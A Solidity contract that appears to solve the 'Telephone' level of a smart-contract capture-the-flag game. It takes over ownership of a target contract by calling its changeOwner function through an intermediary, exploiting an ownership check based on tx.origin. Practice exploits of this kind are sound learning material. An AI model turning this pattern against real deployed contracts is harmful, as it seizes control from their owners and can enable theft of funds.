// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneHack {
    address public owner;
    Telephone telephone;

    constructor(address _telephoneAddress) {
        owner = msg.sender;
        telephone = Telephone(_telephoneAddress);
    }

    function hackOwner() public {
        telephone.changeOwner(owner);
    }
}

interface Telephone {
    function changeOwner(address _owner) external;
}
